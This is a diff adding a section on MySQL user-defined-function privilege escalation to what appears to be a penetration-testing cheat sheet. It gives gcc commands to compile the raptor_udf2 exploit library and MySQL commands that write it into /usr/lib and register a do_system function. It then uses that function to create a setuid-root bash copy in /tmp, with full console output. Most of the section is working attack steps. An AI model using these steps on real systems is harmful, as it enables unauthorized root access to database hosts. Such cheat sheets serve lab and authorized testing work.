@@ -1746,7 +1746,49 @@ flynn@light-cycle:~$ lxc exec test /bin/sh
 root
 ```
 
+## MySQL User Defined Functions (UDF)
+See https://www.exploit-db.com/exploits/1518
 
+Compile:
+```
+$ gcc -g -c raptor_udf2.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+```
+mysql> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> create table foo(line blob);
+Query OK, 0 rows affected (0.03 sec)
+
+mysql> insert into foo values(load_file('/home/j0hn/raptor_udf2.so'));
+Query OK, 1 row affected (0.00 sec)
+
+mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+Query OK, 1 row affected (0.00 sec)
+
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected, 1 warning (0.00 sec)
+
+mysql> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function | 
++-----------+-----+----------------+----------+
+1 row in set (0.00 sec)
+
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
++------------------------------------------------------------------+
+| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
++------------------------------------------------------------------+
+|                                                       4294967296 | 
++------------------------------------------------------------------+
+1 row in set (0.00 sec)
+```
 
 # SMTP
 ## Enumerate users
